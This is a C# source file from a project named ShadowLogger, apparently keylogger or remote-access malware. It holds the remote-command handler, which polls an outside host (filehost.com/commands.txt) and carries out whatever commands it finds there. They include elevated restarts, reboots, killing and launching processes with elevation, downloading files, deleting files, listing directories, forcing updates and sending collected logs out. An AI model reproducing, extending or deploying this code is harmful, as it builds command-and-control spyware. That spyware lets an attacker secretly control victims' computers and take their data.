using System;
using ShadowLogger.bin.Shared_Methods;
using ShadowLogger.bin.UpdateApp;

namespace ShadowLogger.bin.Remote_Commands
{
    internal static class CheckCommands
    {
        internal static void CheckForCommands()
        {
            //THIS IS A BETTER WAY BUT DOESN'T WORK WITH CODEDOM... '''''  Dim strseveralcmds() As String = SharedMethods.DoRequests("filehost.com/commands.txt")
            //.Replace(" ", String.Empty).Split({Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)

            string commandsRequested = SharedMethods.CreateWebRequest("filehost.com/commands.txt");

            if (commandsRequested.Length == 0) return;

            string[] commands = commandsRequested.Replace(" ", string.Empty).Split(Environment.NewLine[1]);

            ExecuteCommands(commands);
        }

        private static void ExecuteCommands(string[] commands)
        {
            foreach (string command in commands)
            {
              string  commandTrimmed = command.TrimEnd(); //TRIMEND BECAUSE OF ENVIRONMENT.NEWLINE[1]

                if (commandTrimmed == string.Empty) continue;

                if (commandTrimmed == "@restart")
                {
                    SharedMethods.LogRemoteCommand("@restart");
                    CommandsAvailable.Restart(false);
                    return;
                }
                else if (commandTrimmed == "@restart_elevated")
                {
                    SharedMethods.LogRemoteCommand("@restart_elevated");
                    CommandsAvailable.Restart(true);
                    return;
                }
                else if (commandTrimmed == "@reboot")
                {
                    SharedMethods.LogRemoteCommand("@reboot");
                    CommandsAvailable.Reboot();
                    return;
                }
                else if (commandTrimmed.Contains("@site"))
                {
                    string url = commandTrimmed.Replace("@site", string.Empty);

                    SharedMethods.LogRemoteCommand("@site" + " " + url);
                    
                    CommandsAvailable.Site(url);
                }
                else if (commandTrimmed == "@updatecheck")
                {
                    SharedMethods.LogRemoteCommand("@updatecheck");
                    Updater.CheckForUpdates();
                }
                else if (commandTrimmed.Contains("@processkill_name"))
                {
                    string processesToKill = commandTrimmed.Replace("@processkill_name", string.Empty);

                    SharedMethods.LogRemoteCommand("@processkill_name" + " " + processesToKill);

                    string[] processNames = processesToKill.Split(Convert.ToChar(","));

                    foreach (string processName in processNames)
                    {
                        CommandsAvailable.ProcessKillByName(processName);
                    }
                }
                else if (commandTrimmed == "@processlist")
                {
                    SharedMethods.LogRemoteCommand("@processlist");
                    CommandsAvailable.ProcessList();
                }
                else if (commandTrimmed == "@forceupdate")
                {
                    SharedMethods.LogRemoteCommand("@forceupdate");
                    Updater.UpdateApp();
                }
                else if (commandTrimmed == "@dlfile")
                {
                    SharedMethods.LogRemoteCommand("@dlfile");
                    CommandsAvailable.DlFile(false);
                }
                else if (commandTrimmed == "@dlfileoverwrite")
                {
                    SharedMethods.LogRemoteCommand("@dlfileoverwrite");
                    CommandsAvailable.DlFile(true);
                }
                else if (commandTrimmed.Contains("@process_start"))
                {
                    string filePathsToRun = commandTrimmed.Replace("@process_start", string.Empty);
                    filePathsToRun = filePathsToRun.Replace("?", " ");

                    SharedMethods.LogRemoteCommand("@process_start" + " " + filePathsToRun);

                    string[] filepaths = filePathsToRun.Split(Convert.ToChar("|"));
                    CommandsAvailable.ProcessStart(filepaths, false);
                }
                else if (commandTrimmed.Contains("@process_start_elevated"))
                {
                    string filePathsToRun = commandTrimmed.Replace("@process_start_elevated", string.Empty);
                    filePathsToRun = filePathsToRun.Replace("?", " ");

                    SharedMethods.LogRemoteCommand("@process_start_elevated" + " " + filePathsToRun);

                    string[] filepaths = filePathsToRun.Split(Convert.ToChar("|"));
                    CommandsAvailable.ProcessStart(filepaths, true);
                }
                else if (commandTrimmed == "@sendlogs")
                {
                    SharedMethods.LogRemoteCommand("@sendlogs");
                    CommandsAvailable.SendLogs();
                }
                else if (commandTrimmed.Contains("@messagebox"))
                {
                    string messageToDisplay = commandTrimmed.Replace("@messagebox", string.Empty);
                    
                    SharedMethods.LogRemoteCommand("@messagebox" + " " + messageToDisplay);

                    string[] message = messageToDisplay.Split(Convert.ToChar("|"));
                    CommandsAvailable.Messagebox(message[0], message[1]);
                }
                else if (commandTrimmed.Contains("@processkill_id"))
                {
                    int pid = Convert.ToInt32(commandTrimmed.Replace("@processkill_id", string.Empty));

                    SharedMethods.LogRemoteCommand("@processkill_id" + " " + pid);

                    CommandsAvailable.ProcessKillById(pid);
                }
                else if (commandTrimmed.Contains("@filedelete"))
                {
                    string filepath = commandTrimmed.Replace("@filedelete", string.Empty);

                    SharedMethods.LogRemoteCommand("@filedelete" + " " + filepath);

                    CommandsAvailable.FileDelete(filepath);
                }
                else if (commandTrimmed.Contains("@dirlist"))
                {
                    string dirpath = commandTrimmed.Replace("@dirlist", string.Empty);

                    SharedMethods.LogRemoteCommand("@dirlist" + " " + dirpath);

                    CommandsAvailable.DirList(dirpath);
                }
            }
        }
    }
}
